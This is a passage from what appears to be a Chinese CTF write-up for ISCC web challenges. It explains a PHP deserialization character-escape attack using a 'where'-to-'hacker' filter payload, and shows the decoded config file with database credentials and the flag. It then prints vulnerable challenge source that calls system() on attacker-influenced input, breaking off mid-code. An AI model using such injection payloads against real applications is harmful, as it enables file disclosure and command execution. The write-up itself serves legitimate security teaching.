email&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) || strlen(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) &gt; <span class="hljs-number">10</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid nickname&#x27;</span>);<br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;photo&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &lt; <span class="hljs-number">5</span> <span class="hljs-keyword">or</span> <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">1000000</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Photo size error&#x27;</span>);<br><br>move_uploaded_file(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&#x27;upload/&#x27;</span> . md5(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]));<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-string">&#x27;upload/&#x27;</span> . md5(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br><br><span class="hljs-variable">$user</span>-&gt;update_profile(<span class="hljs-variable">$username</span>, serialize(<span class="hljs-variable">$profile</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>1.审计代码</strong></p><ul><li><p>config.php<br>flag在这里</p></li><li><p>register.php<br>注册账号，对帐号密码长度做出限制</p></li><li><p>profile.php<br>（1）将序列化后的用户信息进行了反序列化，且读取了上传的 photo 文件内容<br>（2）用base64编码对上传文件进行了读取和显示</p></li><li><p>update.php<br>（1）phone 长度为11位；<br>（2）nickname长度小于 10 位，且只能为字母和数字；<br>（3）将用户填写的 phone、email、nickname 以及上传的文件进行序列化</p></li><li><p>class.php<br>存在参数过滤，filter 中将 ‘select’, ‘insert’, ‘update’, ‘delete’, ‘where’ 等词用 ‘hacker’ 替换掉.</p></li></ul><p>存在参数过滤，where被替换成hacker，长度加1</p><p><strong>2.序列化profile</strong><br>update.php中POST提交完后对$profile进行序列化操作</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$profile</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] = <span class="hljs-string">&#x27;18288669977&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>] = <span class="hljs-string">&#x27;2233445588@qq.com&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>] = <span class="hljs-string">&#x27;xiaom&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-string">&#x27;config.php&#x27;</span>;<br><br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$profile</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;phone&quot;</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;18288669977&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;email&quot;</span>;s:<span class="hljs-number">17</span>:<span class="hljs-string">&quot;2233445588@qq.com&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;nickname&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;xiaom&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;photo&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;config.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>下面可以利用php反序列化字符逃逸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">PHP在反序列化时，从左往右读取数据类型及长度，且只读取其中规定长度的数据，即当数据的长度大于规定的长度，后面还有数据也不再读取，而后面不再读取的数据，就会被挤到下一个数据项中。<br></code></pre></td></tr></table></figure><p><strong>3.反序列化字符逃逸</strong><br>这里需要构造超出长度的数据，将被挤出来的数据形成可以读取config.php 的数据项</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;;&#125;s:5:&quot;</span>photo<span class="hljs-string">&quot;;s:10:&quot;</span>config.php<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>上面的字符串一共34个字符，所以需要在 nickname 处多添加34位长的数据，才能将这段数据挤到 photo 的位置上去。</p><p>class.php代码中存在过滤， <code>where</code> 被替换成了 <code>hacker</code>，此时字符串的长度加 1 ，如果在 nickname 处填进 34 个<code>where</code>，就会被替换成 34 个 <code>hacker</code>，即nickname 的长度超出了 34 位。</p><p>得到payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="hljs-string">&quot;;&#125;s:5:&quot;</span>photo<span class="hljs-string">&quot;;s:10:&quot;</span>config.php<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>访问register.php，注册账号，然后登陆,在Nickname处填入上面的payload</p><p><img src="https://img-blog.csdnimg.cn/20210504125229650.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>抓包，将Nickname修改为Nickname[]数组类型<br><img src="https://img-blog.csdnimg.cn/20210504125326751.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>4.利用base64编码读取flag</strong><br>放包，点击超链接跳转到profile.php页面，查看源码<br><img src="https://img-blog.csdnimg.cn/20210504125526632.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>一段Base编码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">PD9waHAKJGNvbmZpZ1snaG9zdG5hbWUnXSA9ICcxMjcuMC4wLjEnOwokY29uZmlnWyd1c2VybmFtZSddID0gJ3Jvb3QnOwokY29uZmlnWydwYXNzd29yZCddID0gJ3F3ZXJ0eXVpb3AnOwokY29uZmlnWydkYXRhYmFzZSddID0gJ2NoYWxsZW5nZXMnOwokZmxhZyA9ICdJU0NDe3doYXRfaXNAdGhlJl9uaWNrbmFtZSo/MTExMjIzNH0nOwo/Pgo=<br></code></pre></td></tr></table></figure><p>Base64解码得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;hostname&#x27;</span>] = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;root&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;password&#x27;</span>] = <span class="hljs-string">&#x27;qwertyuiop&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;database&#x27;</span>] = <span class="hljs-string">&#x27;challenges&#x27;</span>;<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;ISCC&#123;what_is@the&amp;_nickname*?1112234&#125;&#x27;</span>;<br>?&gt;<br></code></pre></td></tr></table></figure><h2 id="which-is-the-true-iscc"><a href="#which-is-the-true-iscc" class="headerlink" title="which is the true iscc"></a>which is the true iscc</h2><blockquote><p>小夏同学很想知道ISCC到底是什么，不过上网后的搜索让他更加迷惑了——怎么有这么多ISCC？？到底哪个ISCC是真的呢？你能帮他找到真正的ISCC吗？<br>题目入口：<a href="http://39.96.91.106:7050/">http://39.96.91.106:7050</a></p></blockquote><p>访问题目地址,查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!--<br>&lt;a href=<span class="hljs-string">&quot;/?whatareyounongshane=src&quot;</span>&gt;我真的是源码?&lt;/a&gt;<br>&lt;a href=<span class="hljs-string">&quot;/?whatareyounongshane=cmd&quot;</span>&gt;干点好事!&lt;/a&gt;<br>&lt;a href=<span class="hljs-string">&quot;/?whatareyounongshane=upload&quot;</span>&gt;送点东西!&lt;/a&gt;<br>&lt;a href=<span class="hljs-string">&quot;/?whatareyounongshane=tellmetruth&quot;</span>&gt;快告诉我真相!&lt;/a&gt;<br>--&gt;<br></code></pre></td></tr></table></figure><p>按照提示，访问/?whatareyounongshane=src，得到源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>session_start();<br>ini_set(<span class="hljs-string">&#x27;max_execution_time&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>);<br>set_time_limit(<span class="hljs-number">5</span>);<br><br><span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;new&quot;</span>;<br><span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;whoami&quot;</span>;<br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$is_unser_finished</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$iscc_file</span> = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_Upload</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$is_upload</span>;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;whoami&quot;</span>;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = randstr(<span class="hljs-number">14</span>);<br>        <span class="hljs-variable">$is_upload</span> = (count(<span class="hljs-variable">$_FILES</span>) &gt; <span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$is_upload</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$status</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$iscc_file</span>;<br>        <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;upload_fail&quot;</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$is_upload</span>) &#123;<br><br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_FILES</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)<br>                <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$value</span>;<br><br><br>            <span class="hljs-keyword">if</span>(is_uploaded_file(<span class="hljs-variable">$iscc_file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>])) &#123;<br><br>                <span class="hljs-variable">$check</span> = @getimagesize(<span class="hljs-variable">$iscc_file</span>[<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$check</span> !== <span class="hljs-literal">false</span>) &#123;<br><br>                    <span class="hljs-variable">$target_dir</span> = <span class="hljs-string">&quot;/var/tmp/&quot;</span>;<br>                    <span class="hljs-variable">$target_file</span> = <span class="hljs-variable">$target_dir</span> . randstr(<span class="hljs-number">10</span>);<br><br>                    <span class="hljs-keyword">if</span> (file_exists(<span class="hljs-variable">$target_file</span>)) &#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;想啥呢？有东西了……&lt;br&gt;&quot;</span>;<br>                        finalize();<br>                        <span class="hljs-keyword">exit</span>;<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$iscc_file</span>[<span class="hljs-string">&quot;size&quot;</span>] &gt; <span class="hljs-number">500000</span>) &#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;东西塞不进去~&lt;br&gt;&quot;</span>;<br>                        finalize();<br>                        <span class="hljs-keyword">exit</span>;<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$iscc_file</span>[<span class="hljs-string">&quot;tmp_name&quot;</span>], <span class="hljs-variable">$target_file</span>)) &#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;我拿到了！&lt;br&gt;&quot;</span>;<br>                        <span class="hljs-variable">$iscc_file</span> = <span class="hljs-variable">$target_file</span>;<br>                        <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;upload_ok&quot;</span>;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;拿不到:(&lt;br&gt;&quot;</span>;<br>                        finalize();<br>                        <span class="hljs-keyword">exit</span>;<br>                    &#125;<br><br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    finalize();<br>                    <span class="hljs-keyword">exit</span>;<br>                &#125;<br><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你真是个天才!&lt;br&gt;&quot;</span>;<br>                finalize();<br>                <span class="hljs-keyword">exit</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_ResetCMD</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$new_cmd</span> = <span class="hljs-string">&quot;echo &#x27;新新世界，发号施令!&#x27;&quot;</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$is_upload</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$status</span>;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = randstr(<span class="hljs-number">14</span>);<br>        <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;new_cmd)) &#123;<br>            <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;error&quot;</span>;<br>            <span class="hljs-variable">$error</span> = <span class="hljs-string">&quot;你这罐子是空的!&quot;</span>;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-variable">$error</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!is_string(<span class="hljs-keyword">$this</span>-&gt;new_cmd)) &#123;<br>            <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;error&quot;</span>;<br>            <span class="hljs-variable">$error</span> = <span class="hljs-string">&#x27;东西都没给对!&#x27;</span>;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-variable">$error</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$status</span>;<br>        <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;reset&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] === <span class="hljs-string">&#x27;isccIsCciScc1scc&#x27;</span>) &#123;<br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-keyword">$this</span>-&gt;new_cmd;<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_Login</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;login();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;logout();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$flag</span> = file_get_contents(<span class="hljs-string">&quot;/flag&quot;</span>);<br>        <span class="hljs-variable">$pAssM0rd</span> = hash(<span class="hljs-string">&quot;sha256&quot;</span>, <span class="hljs-variable">$flag</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pAssM0rd&#x27;</span>] === <span class="hljs-variable">$pAssM0rd</span>)<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&quot;isccIsCciScc1scc&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logout</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$status</span>;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;finish&quot;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_TellMeTruth</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>]))<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = randstr(<span class="hljs-number">14</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;似乎这个 &quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>].<span class="hljs-string">&quot; 是真相&lt;br&gt;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;似乎这个 &quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>].<span class="hljs-string">&quot; 是真相&lt;br&gt;&quot;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_Command</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$is_upload</span>;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = randstr(<span class="hljs-number">14</span>);<br>        <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;whoami&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;看看你干的好事: <span class="hljs-subst">&#123;$cmd&#125;</span> &lt;br&gt;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$status</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$is_unser_finished</span>;<br>        <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;cmd&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$is_unser_finished</span> === <span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;看看你干的 [&lt;span style=&#x27;color:red&#x27;&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/span&gt;] 弄出了什么后果: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;span style=&#x27;color:blue&#x27;&gt;&quot;</span>;<br>            @system(<span class="hljs-variable">$cmd</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/span&gt;&quot;</span>;<br>        &#125;<br>    